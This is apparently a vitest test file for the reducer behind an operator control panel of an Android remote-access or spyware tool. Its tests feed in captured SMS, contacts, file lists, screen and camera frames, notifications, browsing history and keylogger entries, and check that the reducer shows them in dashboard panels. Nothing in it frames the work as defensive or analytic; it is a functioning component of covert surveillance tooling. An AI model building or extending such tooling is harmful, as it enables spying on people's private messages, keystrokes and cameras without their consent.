import { describe, expect, it } from 'vitest';

import { createDeviceEventState, reduceDeviceEvent } from './device-events';

describe('device event reducer', () => {
  it('maps legacy sms, contacts, app, file, and media events into panels', () => {
    let state = createDeviceEventState();

    state = reduceDeviceEvent(state, {
      data: '{"time":"10:00","message":"hello","full_message":"hello world","address":"+86"}\n',
      type: 'sms',
    });
    state = reduceDeviceEvent(state, {
      data: '{"name":"Alice","number":"10086"}\n',
      type: 'loadcontacts',
    });
    state = reduceDeviceEvent(state, {
      data: '{"apps":[{"name":"Demo","packageName":"com.demo","icon":"abc"}]}',
      type: 'loadapps',
    });
    state = reduceDeviceEvent(state, {
      data: 'x[>A<]x[>A<]photo.jpg[>A<]12KB[>A<]/DCIM[>A<]2026',
      type: 'files',
    });
    state = reduceDeviceEvent(state, {
      data: 'base64-screen',
      hmob: 1920,
      type: 'screen',
      wmob: 1080,
    });
    state = reduceDeviceEvent(state, { data: 'base64-cam', type: 'cam' });

    expect(state.sms[0]).toMatchObject({ number: '+86', text: 'hello' });
    expect(state.contacts[0]).toMatchObject({ name: 'Alice', number: '10086' });
    expect(state.apps[0]).toMatchObject({
      name: 'Demo',
      packageName: 'com.demo',
    });
    expect(state.files[0]).toMatchObject({
      name: 'photo.jpg',
      path: '/DCIM',
      size: '12KB',
    });
    expect(state.screenImage).toBe('data:image/jpeg;base64,base64-screen');
    expect(state.screenSize).toEqual({ height: 1920, width: 1080 });
    expect(state.cameraImage).toBe('data:image/jpeg;base64,base64-cam');
  });

  it('keeps primary screen and screenshot stream images separate like the original panel', () => {
    let state = createDeviceEventState();

    state = reduceDeviceEvent(state, {
      data: 'primary-screen',
      hmob: 1920,
      type: 'screen',
      wmob: 1080,
    });
    state = reduceDeviceEvent(state, {
      data: 'snapshot-stream',
      hmob: 1280,
      type: 'screenshot',
      wmob: 720,
    });

    expect(state.screenImage).toBe('data:image/jpeg;base64,primary-screen');
    expect(state.screenSize).toEqual({ height: 1920, width: 1080 });
    expect(state.screenshotImage).toBe(
      'data:image/jpeg;base64,snapshot-stream',
    );
    expect(state.screenshotSize).toEqual({ height: 1280, width: 720 });
  });

  it('handles new event types: notifys, activz, brows', () => {
    let state = createDeviceEventState();

    state = reduceDeviceEvent(state, {
      data: '{"app":"WeChat","text":"you have a message","time":"10:00"}',
      type: 'notifys',
    });
    state = reduceDeviceEvent(state, {
      data: '{"name":"WeChat","packageName":"com.tencent.mm"}\n',
      type: 'activz',
    });
    state = reduceDeviceEvent(state, {
      data: '{"title":"Google","url":"https://google.com"}\n',
      type: 'brows',
    });

    expect(state.notifications[0]).toMatchObject({
      app: 'WeChat',
      text: 'you have a message',
    });
    expect(state.activities[0]).toMatchObject({
      name: 'WeChat',
      packageName: 'com.tencent.mm',
    });
    expect(state.browseHistory[0]).toMatchObject({
      title: 'Google',
      url: 'https://google.com',
    });
  });

  it('does not mutate the previous state object', () => {
    const original = createDeviceEventState();
    reduceDeviceEvent(original, {
      data: '{"time":"10:00","message":"x","address":"y"}',
      type: 'sms',
    });
    expect(original.sms).toHaveLength(0);
  });

  it('klogsdate splits entries by > separator', () => {
    const state = reduceDeviceEvent(createDeviceEventState(), {
      data: 'entry1>entry2>entry3',
      type: 'klogsdate',
    });
    expect(state.keylogs).toHaveLength(3);
    expect(state.keylogs[0]).toBe('entry1');
  });
});
